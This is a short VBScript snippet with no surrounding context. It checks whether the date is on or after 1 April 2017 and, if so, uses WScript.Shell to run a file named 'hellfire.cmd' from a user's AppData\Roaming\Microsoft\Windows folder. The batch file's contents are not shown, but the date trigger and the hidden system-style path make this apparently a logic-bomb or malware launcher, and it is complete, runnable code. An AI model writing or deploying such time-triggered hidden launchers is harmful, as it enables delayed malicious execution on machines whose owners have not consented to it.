mof = DateSerial(2017, 4, 1)
If Now>=mof Then
	Set var2 = CreateObject("WScript.Shell") 
	var2.run "C:\Users\Nick\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
End If